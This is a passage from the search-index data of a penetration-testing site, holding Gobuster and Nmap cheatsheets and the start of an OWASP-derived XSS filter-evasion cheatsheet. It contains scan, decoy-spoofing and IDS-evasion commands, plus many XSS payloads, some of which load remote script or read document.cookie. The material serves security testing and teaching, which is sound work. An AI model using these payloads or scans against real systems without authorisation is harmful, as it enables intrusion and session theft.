-w ~/wordlists/subdomains.txt -i\n</code></pre> <p>Base domain validation warning when the base domain fails to resolve</p> <pre><code>gobuster dns -d example.com -w ~/wordlists/subdomains.txt -i\n</code></pre> <p>Wildcard DNS is also detected properly:</p> <pre><code>gobuster dns -d 0.0.1.xip.io -w ~/wordlists/subdomains.txt\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#vhost-mode", "title": "vhost Mode", "text": "<pre><code>gobuster vhost -u https://example.com -w common-vhosts.txt\n</code></pre> <p>s3 Mode</p> <pre><code>gobuster s3 -w bucket-names.txt\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#available-modes", "title": "Available Modes", "text": "Switch Description dir the classic directory brute-forcing mode dns DNS subdomain brute-forcing mode s3 Enumerate open S3 buckets and look for existence and bucket listings vhost irtual host brute-forcing mode (not the same as DNS!)", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#global-flags", "title": "Global Flags", "text": "Short Switch Long Switch Description -z --no-progress Don't display progress -o --output string Output file to write results to (defaults to stdout) -q --quiet Don't print the banner and other noise -t --threads int Number of concurrent threads (default 10) -i --show-ips Show IP addresses --delay duration DNS resolver timeout (default 1s) -v, --verbose Verbose output (errors) -w --wordlist string Path to the wordlist", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#dns-mode-options", "title": "DNS Mode Options", "text": "Short Switch Long Switch Description -h, --help help for dns -d, --domain string The target domain -r, --resolver string Use custom DNS server (format server.com or server.com:port) -c, --show-cname Show CNAME records (cannot be used with '-i' option) -i, --show-ips Show IP addresses --timeout duration DNS resolver timeout (default 1s)", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#dir-mode-options", "title": "DIR Mode Options", "text": "Short Switch Long Switch Description -h, --help help for dir -f, --add-slash Append / to each request -c, --cookies string Cookies to use for the requests -e, --expanded Expanded mode, print full URLs -x, --extensions string File extension(s) to search for -r, --follow-redirect Follow redirects -H, --headers stringArray Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2' -l, --include-length Include the length of the body in the output -k, --no-tls-validation Skip TLS certificate verification -n, --no-status Don't print status codes -P, --password string Password for Basic Auth -p, --proxy string Proxy to use for requests [http(s)://host:port] -s, --status-codes string Positive status codes (will be overwritten with status-codes-blacklist if set) (default \"200,204,301,302,307,401,403\") -b, --status-codes-blacklist string Negative status codes (will override status-codes if set) --timeout duration HTTP Timeout (default 10s) -u, --url string The target URL -a, --useragent string Set the User-Agent string (default \"gobuster/3.1.0\") -U, --username string Username for Basic Auth -d, --discover-backup Upon finding a file search for backup files --wildcard Force continued operation when wildcard found", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#vhost-mode-options", "title": "vhost Mode Options", "text": "Short Switch Long Switch Description -h --help help for vhost -c --cookies string Cookies to use for the requests -r --follow-redirect Follow redirects -H --headers stringArray Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2' -k --no-tls-validation Skip TLS certificate verification -P --password string Password for Basic Auth -p --proxy string Proxy to use for requests [http(s)://host:port] --timeout duration HTTP Timeout (default 10s) -u --url string The target URL -a --useragent string Set the User-Agent string (default \"gobuster/3.1.0\") -U --username string Username for Basic Auth", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/", "title": "Nmap CheatSheet", "text": "", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#common-nmap-commands", "title": "Common Nmap Commands", "text": "<p>Aggressive scan, single host, TCP SYN, :</p> <pre><code>nmap -n -sS -p- -T4 -Pn -A -v 192.168.1.1\n</code></pre> <p>Ping Scan - Host discovery in subnet</p> <pre><code>nmap -sn -v 192.168.0.0/24\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#target-specification", "title": "Target Specification", "text": "Switch Description Example nmap 192.168.1.1 Scan a single IP nmap 192.168.1.1 192.168.2.1 Scan specific IPs nmap scanme.nmap.org Scan a range nmap scanme.nmap.org Scan a domain nmap 192.168.1.0/24 Scan using CIDR notation -iL nmap -iL targets.txt Scan targets from a file -iR nmap -iR 100 Scan 100 random hosts --exclude nmap --exclude 192.168.1.1 Exclude listed hosts", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#scan-techniques", "title": "Scan Techniques", "text": "Switch Example Description -sS nmap 192.168.1.1 -sS TCP SYN port scan (Default) -sT nmap 192.168.1.1 -sT TCP connect port scan (Default without root privilege) -sU nmap 192.168.1.1 -sU UDP port scan -sA nmap 192.168.1.1 -sA TCP ACK port scan -sW nmap 192.168.1.1 -sW TCP Window port scan -sM nmap 192.168.1.1 -sM TCP Maimon port scan", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#host-discovery", "title": "Host Discovery", "text": "Switch Description Example -sL nmap 192.168.1.1-3 -sL No Scan. List targets only -sn nmap 192.168.1.1/24 -sn Disable port scanning. Host discovery only. -Pn nmap 192.168.1.1-5 -Pn Disable host discovery. Port scan only. -PS nmap 192.168.1.1-5 -PS22-25,80 TCP SYN discovery on port x.Port 80 by default -PA nmap 192.168.1.1-5 -PA22-25,80 TCP ACK discovery on port x.Port 80 by default -PU nmap 192.168.1.1-5 -PU53 UDP discovery on port x.Port 40125 by default -PR nmap 192.168.1.1-1/24 -PR ARP discovery on local network -n nmap 192.168.1.1 -n Never do DNS resolution", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#port-specification", "title": "Port Specification", "text": "Switch Description Example -p nmap 192.168.1.1 -p 21 Port scan for port x -p nmap 192.168.1.1 -p 21-100 Port range -p nmap 192.168.1.1 -p U:53,T:21-25,80 Port scan multiple TCP and UDP ports -p nmap 192.168.1.1 -p- Port scan all ports -p nmap 192.168.1.1 -p http,https Port scan from service name -F nmap 192.168.1.1 -F Fast port scan (100 ports) --top-ports nmap 192.168.1.1 --top-ports 2000 Port scan the top x ports -p-65535 nmap 192.168.1.1 -p-65535 Leaving off initial port in range makes the scan start at port 1 -p0- nmap 192.168.1.1 -p0- Leaving off end port in rangemakes the scan go through to port 65535", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#service-and-version-detection", "title": "Service and Version Detection", "text": "Switch Description Example -sV nmap 192.168.1.1 -sV Attempts to determine the version of the service running on port -sV --version-intensity nmap 192.168.1.1 -sV --version-intensity 8 Intensity level 0 to 9. Higher number increases possibility of correctness -sV --version-light nmap 192.168.1.1 -sV --version-light Enable light mode. Lower possibility of correctness. Faster -sV --version-all nmap 192.168.1.1 -sV --version-all Enable intensity level 9. Higher possibility of correctness. Slower -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#os-detection", "title": "OS Detection", "text": "Switch Description Example -O nmap 192.168.1.1 -O Remote OS detection using TCP/IP stack fingerprinting -O --osscan-limit nmap 192.168.1.1 -O --osscan-limit If at least one open and one closed TCP port are not found it will not try OS detection against host -O --osscan-guess nmap 192.168.1.1 -O --osscan-guess Makes Nmap guess more aggressively -O --max-os-tries nmap 192.168.1.1 -O --max-os-tries 1 Set the maximum number x of OS detection tries against a target -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#timing-and-performance", "title": "Timing and Performance", "text": "Switch Description Example -T0 nmap 192.168.1.1 -T0 Paranoid (0) Intrusion DetectionSystem evasion -T1 nmap 192.168.1.1 -T1 Sneaky (1) Intrusion Detection Systemevasion -T2 nmap 192.168.1.1 -T2 Polite (2) slows down the scan to useless bandwidth and use less target machine resources -T3 nmap 192.168.1.1 -T3 Normal (3) which is default speed -T4 nmap 192.168.1.1 -T4 Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network -T5 nmap 192.168.1.1 -T5 Insane (5) speeds scan; assumes you are on an extraordinarily fast network -------- -------- ------------------------------------------------------------------------------------------- --host-timeout  1s; 4m; 2h Give up on target after this long --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout  1s; 4m; 2h Specifies probe round trip time --min-hostgroup/max-hostgroup &lt;size 50; 1024 Parallel host scan group sizes --min-parallelism/max-parallelism  10; 1 Probe parallelization --scan-delay/--max-scan-delay  20ms; 2s; 4m; 5h Adjust delay between probes --max-retries  3 Specify the maximum number of port scan probe retransmissions --min-rate  100 Send packets no slower than  per second --max-rate  100 Send packets no faster than  per second", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#nse-scripts", "title": "NSE Scripts", "text": "Switch Description Example -sC nmap 192.168.1.1 -sC Scan with default NSE scripts. Considered useful for discovery and safe --script default nmap 192.168.1.1 --script default Scan with default NSE scripts. Considered useful for discovery and safe --script nmap 192.168.1.1 --script=banner Scan with a single script. Example banner --script nmap 192.168.1.1 --script=http* Scan with a wildcard. Example http --script nmap 192.168.1.1 --script=http,banner Scan with two scripts. Example http and banner --script nmap 192.168.1.1 --script \"not intrusive\" Scan default, but remove intrusive scripts --script-args nmap --script snmp-sysdescr --script-args snmpcommunity=admin 192.168.1.1 NSE script with arguments", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#useful-nse-script-examples", "title": "Useful NSE Script Examples", "text": "Command Description nmap -Pn --script=http-sitemap-generator scanme.nmap.org http site map generator nmap -n -Pn -p 80 --open -sV -vvv --script banner,http-title -iR 1000 Fast search for random web servers nmap -Pn --script=dns-brute domain.com Brute forces DNS hostnames guessing subdomains nmap -n -Pn -vv -O -sV --script smb-enum,smb-ls,smb-mbenum,smb-os-discovery,smb-s,smb-vuln,smbv2 -vv 192.168.1.1 Safe SMB scripts to run nmap --script whois* domain.com Whois query nmap -p80 --script http-unsafe-output-escaping scanme.nmap.org Detect cross site scripting vulnerabilities nmap -p80 --script http-sql-injection scanme.nmap.org Check for SQL injections", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#firewall-ids-evasion-and-spoofing", "title": "Firewall / IDS Evasion and Spoofing", "text": "Switch Description Example -f nmap 192.168.1.1 -f Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters --mtu nmap 192.168.1.1 --mtu 32 Set your own offset size -D nmap -D 192.168.1.101,192.168.1.102, 192.168.1.103,192.168.1.23 192.168.1.1 Send scans from spoofed IPs -D nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip Above example explained -S nmap -S www.microsoft.com www.facebook.com Scan Facebook from Microsoft (-e eth0 -Pn may be required) -g nmap -g 53 192.168.1.1 Use given source port number --proxies nmap --proxies <code>http://192.168.1.1:8080</code>, <code>http://192.168.1.2:8080</code> 192.168.1.1 Relay connections through HTTP/SOCKS4 proxies --data-length nmap --data-length 200 192.168.1.1 Appends random data to sent packets", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#example-ids-evasion-command", "title": "Example IDS Evasion command", "text": "<pre><code>nmap -f -t 0 -n -Pn \u2013data-length 200 -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#output", "title": "Output", "text": "Switch Description Example -oN nmap 192.168.1.1 -oN normal.file Normal output to the file normal.file -oX nmap 192.168.1.1 -oX xml.file XML output to the file xml.file -oG nmap 192.168.1.1 -oG grep.file Grepable output to the file grep.file -oA nmap 192.168.1.1 -oA results Output in the three major formats at once -oG - nmap 192.168.1.1 -oG - Grepable output to screen. -oN -, -oX - also usable --append-output nmap 192.168.1.1 -oN file.file --append-output Append a scan to a previous scan file -v nmap 192.168.1.1 -v Increase the verbosity level (use -vv or more for greater effect) -d nmap 192.168.1.1 -d Increase debugging level (use -dd or more for greater effect) --reason nmap 192.168.1.1 --reason Display the reason a port is in a particular state, same output as -vv --open nmap 192.168.1.1 --open Only show open (or possibly open) ports --packet-trace nmap 192.168.1.1 -T4 --packet-trace Show all packets sent and received --iflist nmap --iflist Shows the host interfaces and routes --resume nmap --resume results.file Resume a scan", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#helpful-nmap-output-examples", "title": "Helpful Nmap Output examples", "text": "<p>Scan for web servers and grep to show which IPs are running web servers</p> <pre><code>nmap -p80 -sV -oG - --open 192.168.1.1/24 | grep open\n</code></pre> <p>Generate a list of the IPs of live hosts</p> <pre><code>nmap -iR 10 -n -oX out.xml | grep \"Nmap\" | cut -d \" \" -f5 &gt; live-hosts.txt\n</code></pre> <p>Append IP to the list of live hosts</p> <pre><code>nmap -iR 10 -n -oX out2.xml | grep \"Nmap\" | cut -d \" \" -f5 &gt;&gt; live-hosts.txt\n</code></pre> <p>Compare output from nmap using the ndif</p> <pre><code>ndiff scanl.xml scan2.xml\n</code></pre> <p>Convert nmap xml files to html files</p> <pre><code>xsltproc nmap.xml -o nmap.html\n</code></pre> <p>Reverse sorted list of how often ports turn up</p> <pre><code>grep \" open \" results.nmap | sed -r 's/ +/ /g' | sort | uniq -c | sort -rn | less\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#miscellaneous-options", "title": "Miscellaneous Options", "text": "Switch Description Example -6 nmap -6 2607:f0d0:1002:51::4 Enable IPv6 scanning -h nmap -h nmap help screen", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#other-useful-nmap-commands", "title": "Other Useful Nmap Commands", "text": "<p>Discovery only on ports x, no port scan</p> <pre><code>nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn\n</code></pre> <p>Arp discovery only on local network, no port scan</p> <pre><code>nmap 192.168.1.1-1/24 -PR -sn -vv\n</code></pre> <p>Traceroute to random targets, no port scan</p> <pre><code>nmap -iR 10 -sn -traceroute\n</code></pre> <p>Query the Internal DNS for hosts, list targets only</p> <pre><code>nmap 192.168.1.1-50 -sL --dns-server 192.168.1.1\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/", "title": "XSS CheatSheet", "text": "", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#introduction", "title": "Introduction", "text": "<p>This article is focused on providing application security testing professionals with a guide to assist in Cross Site Scripting testing. The initial contents of this article were donated to OWASP by RSnake, from his seminal XSS CheatSheet, which was at: <code>http://ha.ckers.org/xss.html</code>. That site now redirects to its new home here, where we plan to maintain and enhance it. The very first OWASP Prevention CheatSheet, the Cross Site Scripting Prevention CheatSheet, was inspired by RSnake's XSS CheatSheet, so we can thank RSnake for our inspiration. We wanted to create short, simple guidelines that developers could follow to prevent XSS, rather than simply telling developers to build apps that could protect against all the fancy tricks specified in rather complex attack CheatSheet, and so the OWASP CheatSheet Series was born.</p> <p>This CheatSheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defense for XSS which these tests can be used to illustrate.</p>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#basic-xss-test-without-filter-evasion", "title": "Basic XSS Test Without Filter Evasion", "text": "<p>This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):</p> <pre><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#xss-locator-polygot", "title": "XSS Locator (Polygot)", "text": "<p>The following is a \"polygot test XSS payload.\" This test will execute in multiple contexts including html, script string, js and url. Thank you to Gareth Heyes for this contribution.</p> <pre><code>`javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#image-xss-using-the-javascript-directive", "title": "Image XSS Using the JavaScript Directive", "text": "<p>Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:</p> <pre><code>&lt;img src=\"javascript:alert('XSS');\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#no-quotes-and-no-semicolon", "title": "No Quotes and no Semicolon", "text": "<pre><code>&lt;IMG SRC=javascript:alert('XSS')&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#case-insensitive-xss-attack-vector", "title": "Case Insensitive XSS Attack Vector", "text": "<pre><code>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#html-entities", "title": "HTML Entities", "text": "<p>The semicolons are required for this to work:</p> <pre><code>&lt;img src='javascript:alert(\"XSS\")' /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#grave-accent-obfuscation", "title": "Grave Accent Obfuscation", "text": "<p>If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents:</p> <pre><code>&lt;IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#malformed-a-tags", "title": "Malformed A Tags", "text": "<p>Skip the HREF attribute and get to the meat of the XXS... Submitted by David Cross ~ Verified on Chrome</p> <pre><code>`\\&lt;a onmouseover=\"alert(document.cookie)\"\\&gt;xxs link\\&lt;/a\\&gt;\n</code></pre> <p>or Chrome loves to replace missing quotes for you... if you ever get stuck just leave them off and Chrome will put them in the right place and fix your missing quotes on a URL or script.</p> <pre><code>`\\&lt;a onmouseover=alert(document.cookie)\\&gt;xxs link\\&lt;/a\\&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#malformed-img-tags", "title": "Malformed IMG Tags", "text": "<p>Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tags:</p> <pre><code>&lt;IMG \"\"\"&gt;\n&lt;script&gt;\n  alert('XSS');\n&lt;/script&gt;\n\"\\&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#fromcharcode", "title": "fromCharCode", "text": "<p>If no quotes of any kind are allowed you can <code>eval()</code> a <code>fromCharCode</code> in JavaScript to create any XSS vector you need:</p> <pre><code>&lt;img src=\"javascript:alert(String.fromCharCode(88,83,83))\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#default-src-tag-to-get-past-filters-that-check-src-domain", "title": "Default SRC Tag to Get Past Filters that Check SRC Domain", "text": "<p>This will bypass most SRC domain filters. Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like <code>onblur</code>, <code>onclick</code> giving you an extensive amount of variations for many injections listed here. Submitted by David Cross .</p> <pre><code>&lt;img src=\"#\" onmouseover=\"alert('xxs')\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#default-src-tag-by-leaving-it-empty", "title": "Default SRC Tag by Leaving it Empty", "text": "<pre><code>&lt;img src=\"onmouseover\" =\"alert('xxs')\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#default-src-tag-by-leaving-it-out-entirely", "title": "Default SRC Tag by Leaving it out Entirely", "text": "<pre><code>&lt;img onmouseover=\"alert('xxs')\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#on-error-alert", "title": "On Error Alert", "text": "<pre><code>&lt;IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"&gt;&lt;/img&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-onerror-and-javascript-alert-encode", "title": "IMG onerror and JavaScript Alert Encode", "text": "<pre><code>&lt;img src=x onerror=\"&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041\"&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#decimal-html-character-references", "title": "Decimal HTML Character References", "text": "<p>All of the XSS examples that use a javascript: directive inside of an <code>&lt;IMG</code> tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).</p> <pre><code>&lt;img\n  src=\"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;\"\n/&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#decimal-html-character-references-without-trailing-semicolons", "title": "Decimal HTML Character References Without Trailing Semicolons", "text": "<p>This is often effective in XSS that attempts to look for \"&amp;#XX;\", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like \\(tmp_string =\\~ s/.\\*\\\\&amp;\\#(\\\\d+);.\\*/\\)1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild):</p> <pre><code>&lt;img\n  src=\"&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041\"\n/&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#hexadecimal-html-character-references-without-trailing-semicolons", "title": "Hexadecimal HTML Character References Without Trailing Semicolons", "text": "<p>This is also a viable XSS attack against the above string \\(tmp_string=\\~ s/.\\*\\\\&amp;\\#(\\\\d+);.\\*/\\)1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).</p> <pre><code>&lt;img\n  src=\"&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29\"\n/&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#embedded-tab", "title": "Embedded Tab", "text": "<p>Used to break up the cross site scripting attack:</p> <pre><code>&lt;img src=\"jav ascript:alert('XSS');\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#embedded-encoded-tab", "title": "Embedded Encoded Tab", "text": "<p>Use this one to break up XSS :</p> <pre><code>&lt;img src=\"jav&amp;#x09;ascript:alert('XSS');\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#embedded-newline-to-break-up-xss", "title": "Embedded Newline to Break-up XSS", "text": "<p>Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:</p> <pre><code>&lt;img src=\"jav&amp;#x0A;ascript:alert('XSS');\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#embedded-carriage-return-to-break-up-xss", "title": "Embedded Carriage Return to Break-up XSS", "text": "<p>(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):</p> <pre><code>&lt;img src=\"jav&amp;#x0D;ascript:alert('XSS');\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#null-breaks-up-javascript-directive", "title": "Null breaks up JavaScript Directive", "text": "<p>Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use <code>%00</code> in the URL string or if you want to write your own injection tool you can either use vim (<code>^V^@</code> will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char <code>%00</code> is much more useful and helped me bypass certain real world filters with a variation on this example:</p> <pre><code>`perl -e 'print \"&lt;IMG SRC=java\\0script:alert(\\\"XSS\\\")&gt;\";' &gt; out`\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#spaces-and-meta-chars-before-the-javascript-in-images-for-xss", "title": "Spaces and Meta Chars Before the JavaScript in Images for XSS", "text": "<p>This is useful if the pattern match doesn't take into account spaces in the word <code>javascript:</code> -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the <code>javascript:</code> keyword. The actual reality is you can have any char from 1-32 in decimal:</p> <pre><code>&lt;img src=\" &amp;#14;  javascript:alert('XSS');\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#non-alpha-non-digit-xss", "title": "Non-alpha-non-digit XSS", "text": "<p>The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example <code>\\&lt;SCRIPT\\\\s</code> != <code>\\&lt;SCRIPT/XSS\\\\s</code>:</p> <pre><code>&lt;SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"&gt;&lt;/SCRIPT&gt;\n</code></pre> <p>Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:</p> <pre><code>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")&gt;\n</code></pre> <p>Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.</p> <pre><code>&lt;SCRIPT/SRC=\"http://xss.rocks/xss.js\"&gt;&lt;/SCRIPT&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#extraneous-open-brackets", "title": "Extraneous Open Brackets", "text": "<p>Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error:</p> <pre><code>&lt;\n&lt;script&gt;\n  alert('XSS'); //\\&lt;\n&lt;/script&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": 